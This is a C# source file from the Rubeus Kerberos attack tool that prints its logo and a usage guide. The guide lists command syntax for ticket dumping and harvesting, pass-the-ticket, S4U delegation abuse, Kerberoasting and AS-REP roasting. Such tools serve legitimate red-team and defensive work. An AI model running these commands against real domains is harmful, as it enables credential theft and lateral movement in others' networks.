﻿using System;

namespace Rubeus.Domain
{
    public static class Info
    {
        public static void ShowLogo()
        {
            Console.WriteLine("\r\n   ______        _                      ");
            Console.WriteLine("  (_____ \\      | |                     ");
            Console.WriteLine("   _____) )_   _| |__  _____ _   _  ___ ");
            Console.WriteLine("  |  __  /| | | |  _ \\| ___ | | | |/___)");
            Console.WriteLine("  | |  \\ \\| |_| | |_) ) ____| |_| |___ |");
            Console.WriteLine("  |_|   |_|____/|____/|_____)____/(___/\r\n");
            Console.WriteLine("  v1.3.4\r\n");
        }

        public static void ShowUsage()
        {
            string usage = @"
Ticket requests and renewals:

    Retrieve a TGT based on a user password/hash, optionally applying to the current logon session or a specific LUID:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] | /rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] |/rc4:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]

    Retrieve a service ticket for one or more SPNs, optionally applying the ticket:
        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]

    Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:
        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]


Constrained delegation abuse:

    Perform S4U constrained delegation abuse:
        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]


Ticket management:

    Submit a TGT, optionally targeting a specific LUID (if elevated):
        Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]

    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):
        Rubeus.exe purge [/luid:LOGINID]

    Parse and describe a ticket (service ticket or TGT):
        Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>


Ticket extraction and harvesting:

    Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:
        Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:LDAP]

    List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:
        Rubeus.exe klist [/luid:LOGINID]

    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
        Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]

    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
        Rubeus.exe tgtdeleg [/target:SPN]

    Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:
        Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER] [/registry:SOFTWARENAME]

    Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:
        Rubeus.exe harvest [/interval:MINUTES] [/registry:SOFTWARENAME]


Roasting:

    Perform Kerberoasting:
        Rubeus.exe kerberoast [/spn:""blah/blah""] [/user:USER] [/ou:""OU,...""]

    Perform Kerberoasting, outputting hashes to a file:
        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:""blah/blah""] [/user:USER] [/ou:""OU,...""]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:""blah/blah""] [/user:USER] [/ou:""OU,...""]

    Perform AS-REP ""roasting"" for any users without preauth:
        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""]

    Perform AS-REP ""roasting"" for any users without preauth, outputting hashes to a file:
        Rubeus.exe asreproast /outfile:hashes.txt [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""]

    Perform AS-REP ""roasting"" for any users without preauth using alternate credentials:
        Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""]


Miscellaneous:

    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
        Rubeus.exe createnetonly /program:""C:\Windows\System32\cmd.exe"" [/show]

    Reset a user's password from a supplied TGT (AoratoPw):
        Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]


NOTE: Base64 ticket blobs can be decoded with :

    [IO.File]::WriteAllBytes(""ticket.kirbi"", [Convert]::FromBase64String(""aa...""))

";
            Console.WriteLine(usage);
        }
    }
}
